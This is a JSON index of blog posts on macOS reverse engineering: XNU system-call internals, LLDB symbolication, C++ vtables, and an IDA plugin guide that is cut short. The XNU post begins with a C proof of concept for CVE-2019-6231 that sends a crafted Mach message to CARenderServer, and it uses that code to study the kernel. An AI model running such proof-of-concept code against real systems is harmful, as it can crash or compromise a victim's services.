[{"title":"1amb4ck","date":"2019-03-05T15:26:30.000Z","path":"2019/03/05/1amb4ck/1amb4ck/","text":"Need password to decrypt! Incorrect Password! No content to display! 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","tags":[]},{"title":"XNU系统调用深度解析","date":"2019-01-30T05:53:00.000Z","path":"2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/","text":"XNU系统调用深度解析 从一个函数分析到系统调用的内核实现 由一段POC而起#include &lt;stdio.h&gt; #include &lt;mach/i386/kern_return.h&gt; #include &lt;mach/mach_traps.h&gt; #include &lt;servers/bootstrap.h&gt; #include &lt;dirent.h&gt; #include &lt;sys/stat.h&gt; #include &lt;time.h&gt; #include &lt;dlfcn.h&gt; #include &lt;unistd.h&gt; typedef struct quartz_register_client_s quartz_register_client_t; struct quartz_register_client_s { mach_msg_header_t header; uint32_t body; mach_msg_port_descriptor_t ports[4]; char padding[12]; }; typedef struct quartzcore_mach_msg quartzcore_mach_msg_t; struct quartzcore_mach_msg{ mach_msg_header_t header; char msg_body[712]; }; uint64_t get_filesize(const char *fn){ struct stat st; stat(fn, &amp;st); uint64_t fsize = st.st_size; return fsize; }; int main(int argc, const char * argv[]) { mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL; task_get_bootstrap_port(mach_task_self(), &amp;bs_port); const char *render_service_name = &quot;com.apple.CARenderServer&quot;; kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;); kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p); if (kr != KERN_SUCCESS) { return -1; } printf(&quot;[*] Get service of %s successully!\\n&quot;, render_service_name); quartz_register_client_t msg_register; memset(&amp;msg_register, 0, sizeof(msg_register)); msg_register.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX; msg_register.header.msgh_remote_port = p; msg_register.header.msgh_local_port = mig_get_reply_port(); msg_register.header.msgh_id = 40202; // _XRegisterClient msg_register.body = 4; msg_register.ports[0].name = mach_task_self(); msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND; msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR; msg_register.ports[1].name = mach_task_self(); msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND; msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR; msg_register.ports[2].name = mach_task_self(); msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND; msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR; msg_register.ports[3].name = mach_task_self(); msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND; msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR; kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG, sizeof(quartz_register_client_t), sizeof(quartz_register_client_t), msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL); if (kr != KERN_SUCCESS) { return -1 ; } mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c); uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30); printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\\n&quot;,context_port,conn_id); char *crash_log = &quot;crash.data&quot;; //size is 736. FILE *fp = fopen(crash_log, &quot;rb&quot;); if(fp == NULL){ printf(&quot;fopen error!\\n&quot;); } uint64_t fsize = get_filesize(crash_log); void *msg_buf = malloc(fsize); memset(msg_buf, 0, fsize); fread(msg_buf, fsize, 1, fp); quartzcore_mach_msg_t qc_mach_msg = {0}; qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX; qc_mach_msg.header.msgh_remote_port = context_port; qc_mach_msg.header.msgh_id = 40002; memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body)); *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1; // Ports count memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc); *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id; kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL); if (kr != KERN_SUCCESS) { printf(&quot;[-] Send message failed: 0x%d\\n&quot;, kr); return -1 ; } return 0; } 里面的macho函数mach_msg()到底后面执行到哪里？于是展开一段追踪 从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。 * thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1 frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msg libsystem_kernel.dylib`mach_msg: -&gt; 0x7fff79299694 &lt;+0&gt;: pushq %rbp 0x7fff79299695 &lt;+1&gt;: movq %rsp, %rbp 0x7fff79299698 &lt;+4&gt;: pushq %r15 0x7fff7929969a &lt;+6&gt;: pushq %r14 Target 0: (CVE-2019-6231-poc) stopped. 调试可以看出mach_msg实现在libsystem_kernel.dylib之中 (lldb) dis libsystem_kernel.dylib`mach_msg: -&gt; 0x7fff79299694 &lt;+0&gt;: pushq %rbp 0x7fff79299695 &lt;+1&gt;: movq %rsp, %rbp 0x7fff79299698 &lt;+4&gt;: pushq %r15 0x7fff7929969a &lt;+6&gt;: pushq %r14 0x7fff7929969c &lt;+8&gt;: pushq %r13 0x7fff7929969e &lt;+10&gt;: pushq %r12 0x7fff792996a0 &lt;+12&gt;: pushq %rbx 0x7fff792996a1 &lt;+13&gt;: subq $0x28, %rsp 0x7fff792996a5 &lt;+17&gt;: movl %ecx, %r13d 0x7fff792996a8 &lt;+20&gt;: movl %esi, %ebx 0x7fff792996aa &lt;+22&gt;: movq %rdi, %r14 0x7fff792996ad &lt;+25&gt;: movl 0x10(%rbp), %eax 0x7fff792996b0 &lt;+28&gt;: movl %ebx, %r12d 0x7fff792996b3 &lt;+31&gt;: andl $0xfffffbbf, %r12d ; imm = 0xFFFFFBBF 0x7fff792996ba &lt;+38&gt;: movl %eax, (%rsp) 0x7fff792996bd &lt;+41&gt;: movl %r12d, %esi 0x7fff792996c0 &lt;+44&gt;: movl %edx, %r15d 0x7fff792996c3 &lt;+47&gt;: movl %r8d, -0x2c(%rbp) 0x7fff792996c7 &lt;+51&gt;: movl %r9d, -0x30(%rbp) 0x7fff792996cb &lt;+55&gt;: callq 0x7fff79299170 ; mach_msg_trap ... mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify) { mach_msg_return_t result; // eax mach_msg_option_t v8; // er12 result = mach_msg_trap(); if ( !result ) return 0; if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 ) { do result = mach_msg_trap(); while ( result == 268435463 ); } v8 = option; if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 ) { do result = mach_msg_trap(); while ( result == 268451845 ); } return result; } 通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下 * thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1 frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_trap libsystem_kernel.dylib`mach_msg_trap: -&gt; 0x7fff79299170 &lt;+0&gt;: movq %rcx, %r10 0x7fff79299173 &lt;+3&gt;: movl $0x100001f, %eax ; imm = 0x100001F 0x7fff79299178 &lt;+8&gt;: syscall 0x7fff7929917a &lt;+10&gt;: retq Target 0: (CVE-2019-6231-poc) stopped. 这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。 XNU内核系统调用流程系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过intel官方文档可以找到 SYSCALL invokes an OS system-call handler at privilege level 0. It does so by loading RIP from the IA32_LSTAR MSR 也就是内核需要将系统调用处理函数入口放到IA32_LSTAR model specific register. 在内核源码中对应在osfmk/i386/mp_desc.c的cpu_syscall_init(cpu_data_t *cdp)函数之中 /* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */ void cpu_syscall_init(cpu_data_t *cdp) { #if MONOTONIC mt_cpu_up(cdp); #else /* MONOTONIC */ #pragma unused(cdp) #endif /* !MONOTONIC */ wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS); wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter)); wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku); /* Enable syscall/sysret */ wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE); /* * MSRs for 64-bit syscall/sysret * Note USER_CS because sysret uses this + 16 when returning to * 64-bit code. */ wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall)); wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32)); /* * Emulate eflags cleared by sysenter but note that * we also clear the trace trap to avoid the complications * of single-stepping into a syscall. The nested task bit * is also cleared to avoid a spurious &quot;task switch&quot; * should we choose to return via an IRET. */ wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT); } wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));也就是系统调用会由hi64_syscall函数处理。这个函数实现在xnu/osfmk/x86_64/idt64.s之中 Entry(hi64_syscall) Entry(idt64_syscall) swapgs /* Use RAX as a temporary by shifting its contents into R11[32:63] * The systemcall number is defined to be a 32-bit quantity, as is * RFLAGS. */ shlq $32, %rax or %rax, %r11 .globl EXT(dblsyscall_patch_point) EXT(dblsyscall_patch_point): // movabsq $0x12345678ABCDEFFFULL, %rax /* Generate offset to the double-mapped per-CPU data shadow * into RAX */ leaq EXT(idt64_hndl_table0)(%rip), %rax mov 16(%rax), %rax mov %rsp, %gs:CPU_UBER_TMP(%rax) /* save user stack */ mov %gs:CPU_ESTACK(%rax), %rsp /* switch stack to per-cpu estack */ sub $(ISF64_SIZE), %rsp /* * Synthesize an ISF frame on the exception stack */ movl $(USER_DS), ISF64_SS(%rsp) mov %rcx, ISF64_RIP(%rsp) /* rip */ mov %gs:CPU_UBER_TMP(%rax), %rcx mov %rcx, ISF64_RSP(%rsp) /* user stack --changed */ mov %r11, %rax shrq $32, %rax /* Restore RAX */ mov %r11d, %r11d /* Clear r11[32:63] */ mov %r11, ISF64_RFLAGS(%rsp) /* rflags */ movl $(SYSCALL_CS), ISF64_CS(%rsp) /* cs - a pseudo-segment */ mov %rax, ISF64_ERR(%rsp) /* err/rax - syscall code */ movq $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp) movq $(T_SYSCALL), ISF64_TRAPNO(%rsp) /* trapno */ swapgs jmp L_dispatch /* this can only be 64-bit */ 继续跟下去，会得到如下执行流程 syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt; L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall /* * 64bit Tasks * System call entries via syscall only: * * r15 x86_saved_state64_t * rsp kernel stack * * both rsp and r15 are 16-byte aligned * interrupts disabled * direction flag cleared */ Entry(hndl_syscall) TIME_TRAP_UENTRY movq %gs:CPU_ACTIVE_THREAD,%rcx /* get current thread */ movl $-1, TH_IOTIER_OVERRIDE(%rcx) /* Reset IO tier override to -1 before handling syscall */ movq TH_TASK(%rcx),%rbx /* point to current task */ /* Check for active vtimers in the current task */ TASK_VTIMER_CHECK(%rbx,%rcx) /* * We can be here either for a mach, unix machdep or diag syscall, * as indicated by the syscall class: */ movl R64_RAX(%r15), %eax /* syscall number/class */ movl %eax, %edx andl $(SYSCALL_CLASS_MASK), %edx /* syscall class */ cmpl $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx je EXT(hndl_mach_scall64) cmpl $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx je EXT(hndl_unix_scall64) cmpl $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx je EXT(hndl_mdep_scall64) cmpl $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx je EXT(hndl_diag_scall64) /* Syscall class unknown */ sti CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1) /* no return */ hndl_syscall这个函数会系统调用分为hndl_unix_scall64 、hndl_mach_scall64、hndl_mdep_scall64、hndl_diag_scall64四类分别处理 这里以hndl_unix_scall64为列 Entry(hndl_unix_scall) TIME_TRAP_UENTRY movq %gs:CPU_ACTIVE_THREAD,%rcx /* get current thread */ movq TH_TASK(%rcx),%rbx /* point to current task */ incl TH_SYSCALLS_UNIX(%rcx) /* increment call count */ /* Check for active vtimers in the current task */ TASK_VTIMER_CHECK(%rbx,%rcx) sti CCALL1(unix_syscall, %r15) /* * always returns through thread_exception_return */ 这里调动了unix_syscall函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查 以及根据系统调用表去调用对应的实现 thread = current_thread(); uthread = get_bsdthread_info(thread); // regs is derrived from r15 ... code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK; callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code]; // ... vt = (void *)uthread-&gt;uu_arg; // ... memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi, args_in_regs * sizeof(syscall_arg_t)); // ... error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); 目前执行的流程如下 hi64_syscall L_dispatch_U64 L_dispatch_64bit L_common_dispatch hndl_syscall // rdx, pushed in hi64_syscall hndl_unix_scall64 unix_syscall64 error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there 参考https://www.binss.me/blog/interrupt-and-exception/ https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html https://gist.github.com/yrp604/23e86dce9ca12bf514ef","tags":[{"name":"XNU","slug":"XNU","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"},{"name":"Kernel","slug":"Kernel","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"}]},{"title":"LLDB调试器栈符号化","date":"2018-10-03T05:27:59.000Z","path":"2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/","text":"强化你的lldb调试器Why?lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。 How?但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。 正好lldb提供了python的接口，可以开发自定义的命令。 And what ?虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在这里 这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下： update现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入sbt -f block-json-file-path即可加载该文件。效果如下： 原始的bt命令结果 sbt命令（没有加载block符号文件） sbt命令（带有block符号文件）","tags":[{"name":"LLDB","slug":"LLDB","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"},{"name":"python","slug":"python","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"}]},{"title":"C++类结构以及vtable分析","date":"2017-12-02T10:07:00.000Z","path":"2017/12/02/C++类结构以及vtable分析/C++类结构以及vtable分析/","text":"C++类结构以及vtable分析 通过实验自己对一些C++数据结构的理解 实验一#include &lt;iostream&gt; using namespace std; // 基类 class Shape { public: void setWidth(int w) { width = w; } void setHeight(int h) { height = h; } protected: int width; int height; }; // 派生类 class Rectangle: public Shape { public: int getArea() { return (width * height); } }; int main(void) { Rectangle Rect; Rect.setWidth(5); Rect.setHeight(7); // 输出对象的面积 cout &lt;&lt; &quot;Total area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl; return 0; } 上面的代码编译完成后，在ida中反汇编如下 int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // ST08_8 unsigned int v4; // eax char v6; // [rsp+10h] [rbp-20h] int v7; // [rsp+1Ch] [rbp-14h] __int64 (__fastcall *v8)(_QWORD); // [rsp+20h] [rbp-10h] __int64 v9; // [rsp+28h] [rbp-8h] v7 = 0; Shape::setWidth((Shape *)&amp;v6, 5); Shape::setHeight((Shape *)&amp;v6, 7); v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;); v4 = Rectangle::getArea((Rectangle *)&amp;v6); v9 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4); v8 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;; std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v9); return 0; } Rect内存布局 (lldb) x/20b $rbp-0x20 0x7ffeefbff560: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00 0x7ffeefbff568: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 能得到的结论是，在编译完后，子类Rectangle的方法调用都编译成父类Shape方法调用，这是在编译时就决定了的。把子类对象和参数合并作为参数传入父类方法。这里仅仅是对子类对象另个偏移值做操作。 int __cdecl main(int argc, const char **argv, const char **envp) { void *v3; // ST10_8 __int64 v4; // ST08_8 unsigned int v5; // eax __int64 v6; // ST38_8 v3 = (void *)operator new(8uLL); memset(v3, 0, 8uLL); Shape::setWidth((Shape *)v3, 5); Shape::setHeight((Shape *)v3, 7); v4 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;); v5 = Rectangle::getArea((Rectangle *)v3); v6 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v4, v5); std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v6); return 0; } 这里将 Rectangle Rect改为Rectangle *Rect = new Rectangle()在堆上申请内存可以看出，在类初始化的时候，仅仅申请了一块8字节空间，正好是两个int的大小，仅此而已。 实验二#include &lt;iostream&gt; using namespace std; // 基类 class Shape { public: // 提供接口框架的纯虚函数 virtual int getArea() = 0; void setWidth(int w) { width = w; } void setHeight(int h) { height = h; } protected: int width; int height; }; // 派生类 class Rectangle: public Shape { public: int getArea() { return (width * height); } }; class Triangle: public Shape { public: int getArea() { return (width * height)/2; } }; int main(void) { Rectangle Rect; Triangle Tri; Rect.setWidth(5); Rect.setHeight(7); // 输出对象的面积 cout &lt;&lt; &quot;Total Rectangle area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl; Tri.setWidth(5); Tri.setHeight(7); // 输出对象的面积 cout &lt;&lt; &quot;Total Triangle area: &quot; &lt;&lt; Tri.getArea() &lt;&lt; endl; return 0; } 上面的代码编译完成后，在ida中反汇编如下 int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // ST20_8 unsigned int v4; // eax __int64 v5; // ST10_8 unsigned int v6; // eax char v8; // [rsp+28h] [rbp-48h] char v9; // [rsp+38h] [rbp-38h] int v10; // [rsp+4Ch] [rbp-24h] __int64 (__fastcall *v11)(_QWORD); // [rsp+50h] [rbp-20h] __int64 v12; // [rsp+58h] [rbp-18h] __int64 (__fastcall *v13)(_QWORD); // [rsp+60h] [rbp-10h] __int64 v14; // [rsp+68h] [rbp-8h] v10 = 0; Rectangle::Rectangle((Rectangle *)&amp;v9); Triangle::Triangle((Triangle *)&amp;v8); Shape::setWidth((Shape *)&amp;v9, 5); Shape::setHeight((Shape *)&amp;v9, 7); v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Rectangle area: &quot;); v4 = Rectangle::getArea((Rectangle *)&amp;v9); v12 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4); v11 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;; std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v12); Shape::setWidth((Shape *)&amp;v8, 5); Shape::setHeight((Shape *)&amp;v8, 7); v5 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Triangle area: &quot;); v6 = Triangle::getArea((Triangle *)&amp;v8); v14 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, v6); v13 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;; std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v14); return 0; } 这里与实验一明显不同在于，在初始化一个对象的时候会调用其构建方法。其反汇编代码如下 __int64 *__fastcall Rectangle::Rectangle(Rectangle *this) { __int64 *result; // rax Shape::Shape(this); result = &amp;`vtable for&#39;Rectangle + 2; *(_QWORD *)this = &amp;`vtable for&#39;Rectangle + 2; return result; } 这里发现里面还调用了父类的构建方法，父类构建方法反汇编代码如下 __int64 *__fastcall Shape::Shape(Shape *this) { __int64 *result; // rax result = &amp;`vtable for&#39;Shape + 2; *(_QWORD *)this = &amp;`vtable for&#39;Shape + 2; return result; } 其实这两个构建方法就是对传入对象this指针赋值操作，在经过Shape::Shape(this)后其实this指针的64字节大小值为父类Shape的虚函数表地址。然后又被重新赋值为Rectangle自己的虚函数表地址。 这里的虚函数表地址，本质就是_DATA段的一个数据结构。 Rect的内存布局为 (lldb) x/20b $rbp-0x38 0x7ffeefbff548: 0x20 0x21 0x00 0x00 0x01 0x00 0x00 0x00 0x7ffeefbff550: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00 这里可以看到前64字节为虚函数表地址，后面两个32字节分别是其width和height 去ida中查看该地址 __data:0000000100002110 ; `vtable for&#39;Rectangle __data:0000000100002110 __ZTV9Rectangle dq 0 ; DATA XREF: __got:__ZTV9Rectangle_ptr↑o __data:0000000100002110 ; offset to this __data:0000000100002118 dq offset __ZTI9Rectangle ; `typeinfo for&#39;Rectangle __data:0000000100002120 dq offset __ZN9Rectangle7getAreaEv ; Rectangle::getArea(void) 就是_DATA段中的数据结构，现在我们可以清晰的理解C++类在内存的数据结构了。 一点理解C++这个语言特性非常多，如果不能理解其本质很容易造成bug。这里想把C++和OC做一个简单的对比，C++的很多实现都是在编译时就确定的，C++中的类我更愿意理解成为C中的结构体。而OC这语言，大多都是在运行时才能确定，方法转化为消息处理。在可执行文件中也有专门的段存储其复杂的类数据结构，也因为这样，OC在运行时可以做很多hack操作，比如hook其方法实现等等。","tags":[{"name":"C++","slug":"C","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"}]},{"title":"IDA7.0 Mac 插件编译指南v1","date":"2017-11-30T06:25:09.000Z","path":"2017/11/30/IDA-Mac-插件编写指南/IDA-Mac-插件编写指南/","text":"先说两句前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 